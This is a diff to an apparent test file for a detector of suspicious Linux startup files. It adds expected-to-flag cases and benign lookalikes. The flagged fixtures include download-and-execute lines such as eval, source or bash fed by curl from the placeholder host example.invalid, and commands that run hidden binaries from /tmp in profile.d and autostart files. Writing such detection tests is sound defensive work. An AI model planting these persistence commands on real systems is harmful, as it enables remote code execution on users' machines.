@@ -46,6 +46,15 @@ SIGNED = [
     ("autostart", "/etc/xdg/autostart/placeholder.desktop",
      '[Desktop Entry]\nExec=bash -c "$(wget -qO- http://example.invalid/a)"\n', "download_into_shell"),
     ("ssh", "/etc/ssh/sshrc", "/tmp/.s/agent &\n", "runs_from_temporary"),
+    # From review: a redirection's file is not a command, but a script a shell reads from one is run.
+    ("shell_startup", "/etc/profile.d/r1.sh", "run >> /tmp/a.log 2>&1; /tmp/.x/run\n", "runs_from_temporary"),
+    ("shell_startup", "/etc/profile.d/r2.sh", "sh < /tmp/setup.sh\n", "runs_from_temporary"),
+    # From review: a substituted download counts where its output is run.
+    ("shell_startup", "/etc/profile.d/d1.sh", "$(curl -fsSL https://example.invalid/i)\n", "download_into_shell"),
+    ("shell_startup", "/etc/profile.d/d2.sh", 'eval "$(curl -s https://example.invalid/i)"\n', "download_into_shell"),
+    ("shell_startup", "/etc/profile.d/d3.sh", "source <(curl -s https://example.invalid/i)\n", "download_into_shell"),
+    ("shell_startup", "/etc/profile.d/d4.sh", "bash <(curl -s https://example.invalid/i)\n", "download_into_shell"),
+    ("shell_startup", "/etc/profile.d/d5.sh", ". <(curl -s https://example.invalid/i)\n", "download_into_shell"),
 ]
 
 QUIET = [
@@ -55,6 +64,13 @@ QUIET = [
     ("shell_startup", "/etc/profile.d/quoted.sh",
      'error "skeleton directory `/etc/skel/.gnupg\' does not exist"\ntouch "${ROOT}/etc/.pwd.lock"\n'),
     ("shell_startup", "/home/alice/.bashrc", "/home/alice/.local/bin/tool --start\nPATH=/root/.cargo/bin:$PATH\n"),
+    # From review: files a command writes to or reads from, and downloads only stored or passed on.
+    ("shell_startup", "/etc/profile.d/redirects.sh",
+     "echo ready > /tmp/ready.log\ncat < /tmp/input.txt\nrun 2>/tmp/err.log\n"
+     "python3 > /tmp/app.log /opt/app/main.py\n> /tmp/started /usr/bin/true\n"),
+    ("shell_startup", "/etc/profile.d/fetched.sh",
+     "VERSION=$(curl -fsSL https://example.invalid/version)\nx=$(wget -qO- https://example.invalid/v) && echo $x\n"
+     "echo $(curl -s https://example.invalid/ip) >> /var/log/ip\ndiff <(curl -s https://example.invalid/a) /etc/a\n"),
     ("init", "/etc/init.d/placeholder", '#!/bin/sh\n# curl http://example.invalid | sh\nif (-e "/tmp/.X11-unix/X$n")\n'),
 ]
 
